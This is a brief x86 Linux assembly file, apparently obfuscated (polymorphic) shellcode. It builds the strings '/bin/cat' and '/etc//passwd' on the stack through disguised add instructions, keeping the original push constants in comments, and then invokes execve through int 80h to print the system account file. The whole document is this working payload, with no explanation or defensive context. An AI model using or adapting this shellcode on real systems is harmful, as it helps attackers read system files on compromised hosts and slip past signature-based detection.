global _start
section .text
_start:
xor eax,eax
cdq
push edx
;push dword 0x7461632f
add eax,0x01010101
add eax,0x7360622e
push eax
xor eax,eax
;push dword 0x6e69622f
add eax,0x01010101
add eax,0x6d68612e
push eax
xor eax,eax
mov ebx,esp
push edx
;push dword 0x64777373
add eax,0x01010101
add eax,0x63767272
push eax
xor eax,eax
;push dword 0x61702f2f
add eax,0x01010101
add eax,0x606f2e2e
push eax
xor eax,eax
push dword 0x6374652f
mov ecx,esp
;mov al,0xb
add al,0xb ; same as move 11
push edx
push ecx
push ebx
mov ecx,esp
int 80h
